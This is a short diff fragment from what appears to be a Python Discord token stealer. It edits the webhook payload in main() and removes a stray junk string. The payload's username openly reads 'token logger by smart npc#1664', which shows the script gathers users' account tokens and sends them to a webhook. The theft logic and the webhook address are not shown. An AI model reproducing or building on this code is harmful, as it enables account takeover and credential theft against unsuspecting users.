@@ -177,7 +177,7 @@ def main():
         working.append('123')
     webhook = { 
         "content": "",
-        "embeds": embeds,        JfLOXKbEjmsEzP19
+        "embeds": embeds,  
         "username": "token logger by smart npc#1664",
         "avatar_url": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR5Ix_tvhaqdXjjHGWyFXKbWcK7oaryl1Rz-g&usqp=CAU"
     }
